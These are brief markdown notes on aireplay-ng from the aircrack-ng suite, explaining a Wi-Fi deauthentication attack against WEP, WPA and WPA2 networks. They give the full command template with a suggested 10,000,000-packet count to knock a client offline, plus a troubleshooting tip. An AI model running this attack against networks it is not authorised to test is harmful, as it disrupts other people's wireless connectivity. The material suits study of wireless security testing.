# aireplay-ng

* Part of the _aircrack-ng_ suit.

## Deauthentication Attack

* Works on encrypted networks (WEP, WPA & WPA2).
* No need to know network's key or connect to the network.

Try the following command with `PACKET_AMOUNT = 10000000`.

```
aireplay-ng --deauth <PACKET_AMOUNT> -a <TARGET_NETWORK_BSSID> -c <TARGET_STATION/CLIENT_MAC> <MONITOR_IF>
```

If the command fails, run `airodump-ng` along with it, to sniff network with the `--target` flag.